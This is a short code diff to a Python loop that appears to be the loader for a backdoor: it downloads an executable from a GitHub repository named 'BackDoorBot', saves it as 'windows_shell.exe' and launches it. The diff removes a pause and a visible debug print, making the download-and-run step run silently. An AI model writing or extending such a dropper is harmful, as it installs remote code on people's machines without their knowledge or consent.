@@ -32,7 +32,6 @@ while 1:
         klop, kakai_versia=main()
         if klop:
             os.startfile("windows_shell.exe")
-            i=input()
             break
         else:
             wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe", p+"/vers/windows_shell.exe")
@@ -45,4 +44,4 @@ while 1:
             vers.close()
             os.remove(p+"/vers/version.txt")
     else:
-        print(0)
+        pass
